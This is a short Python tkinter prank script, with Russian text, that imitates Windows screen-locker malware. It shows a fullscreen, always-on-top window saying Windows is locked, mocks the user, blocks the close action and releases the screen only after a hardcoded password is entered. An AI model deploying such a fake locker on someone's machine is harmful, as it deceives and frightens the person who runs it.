from tkinter import *
from tkinter import messagebox

# window
root = Tk()

root.resizable( 0, 0 )
root.attributes( '-fullscreen', True ) # открываем окно в полноэкранном режиме
root.wm_attributes('-topmost', 1) # окно всегда будет поверх остальных
root.title( 'Виндовс заблокирован' )
root [ 'bg' ] = 'black'

# function
def vesti():
    P = parol.get() # получаем Entry

    if P == '1209348756':
        messagebox.showinfo( 'успех', 'Правильный пароль' )
        root.quit()
    else:
        messagebox.showerror( 'ошибка', 'неправильный пароль' )


def nepravilno():
    messagebox.showerror( 'ошибка', 'Не пытайся выйти' )

# interface
nadpis = Label( 

    text = 'Виндовс заблокирован, ты лох!)))', 
    font = 'Consolas 30' , 
    bg = 'black', 
    fg = 'red'

)

nadpis2 = Label( 

    text = 'Напиши мне "ты дурачок" на номер 8 800 555 35 35', 
    font = 'Consolas 30' , 
    bg = 'black', 
    fg = 'red'

)

parol = Entry( 

    root,
    font = 'Consolas 30',
    bg = 'white',
    fg = 'red',
    relief = 'solid',
    justify = 'right',
    show = '*',
    width = '50'

)

vvesti = Button(
    
    text = 'Ввести пароль', font = 'Consolas 30',
    bg = 'white',
	fg = 'green',
    activeforeground = 'white',
    activebackground = 'black',
    width = '20',
    height = '2',
	command = vesti

)

root.protocol( 'WM_DELETE_WINDOW', nepravilno ) # не даём выйти(при нажатии альт ф4 или других способов)

# packer
nadpis.pack()
nadpis2.pack()
parol.pack()
vvesti.pack( side = 'bottom' )

root.mainloop()
